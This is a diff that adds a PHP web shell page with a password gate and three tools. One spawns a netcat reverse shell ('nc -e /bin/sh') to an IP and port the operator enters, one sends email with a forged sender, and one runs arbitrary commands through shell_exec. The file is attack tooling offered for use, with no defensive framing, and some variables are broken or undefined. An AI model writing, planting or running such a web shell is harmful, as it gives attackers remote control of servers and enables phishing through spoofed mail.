@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+<?php
+  session_start();
+  
+  function safe($arr, $key) {
+    if(isset($arr[$key]))
+      return $arr[$key];
+    else
+      return '';
+  }
+  
+  if(safe($_POST, 'pass') === $pass)
+    $_SESSION['auth'] = true;
+  
+  $auth = false;
+  if(safe($_SESSION, 'auth') === true)
+    $auth = true;
+  
+  $title = $auth ? "Simple Shell" : "Login";
+  echo "<title>$title</title>";
+?>
+  <style>
+html, body {
+  font:       1em 'Cooper Black', serif;
+  color:      #00688b;
+  margin:     0;
+  padding:    0;
+  background: url(http://i.imgur.com/LZ7EQ.jpg);
+}
+
+.center {
+  text-align: center;
+}
+
+label {
+  width:   10em;
+  display: inline-block;
+}
+  </style>
+</head>
+<body>
+<?php if(!$auth) { ?>
+  <form method="post" action="" class="center">
+    <label for="pass">Password:</label>
+    <input type="password" name="pass"><br>
+    <input type="submit" value="Login">
+  </form>
+<?php } else { ?>
+  <span class="center">
+    <a href="?page=1">Reverse Shell</a>
+    <a href="?page=2">Spoof Mailer</a>
+    <a href="?page=3">Shell</a>
+  </span>
+<?php
+  $page = safe($_GET, 'page');
+  
+  switch($page) {
+    default:
+    case '1':
+?>
+  <form method="post" action="" class="center">
+    <label for="RHOST">IP:</label>
+    <input type="text" name="RHOST"><br>
+    <label for="PORT">Port:</label>
+    <input type="text" name="PORT"><br>
+    <input type="submit" value="Spawn">
+  </form>
+<?php
+      if(isset($_POST['RHOST']) && isset($_POST['PORT']))
+        exec('nc -e /bin/sh ' . $_POST['RHOST'] . ' ' . $_POST['PORT']);
+    break;
+    
+    case '2':
+?>
+  <form method="post" action="">
+    <label for="from">From:</label>
+    <input type="text" name="from"><br>
+    <label for="to">To:</label>
+    <input type="text" name="to"><br>
+    <label for="subject">Subject:</label>
+    <input type="text" name="subject"><br>
+    <label for="message">Message:</label>
+    <input type="text" name="message"><br>
+    <label for="auth">Password:</label>
+    <input type="text" name="auth"><br>
+    <input type="submit" value="Send">
+  </form>
+<?php
+    if(safe($_POST, 'auth') === $email_pass) {
+      $from = safe($_POST, 'from');
+      $to   = safe($_POST, 'to');
+      $subj = safe($_POST, 'subject');
+      $msg  = safe($_POST, 'message');
+      
+      mail($to, $subject, $msg, "From: $from");
+    }
+    break;
+    
+    case '3':
+?>
+  <form method="post" action="" class="center">
+    <label for="command">Command:</label>
+    <input type="text" name="command"><br>
+    <input type="submit" value="Execute">
+  </form>
+<?php
+      if(isset($_POST['command']))
+        echo '<pre>' . shell_exec($POST['command']) . '</pre>';
+    break;
+  }
+}
+?>
+</body>
+</html>
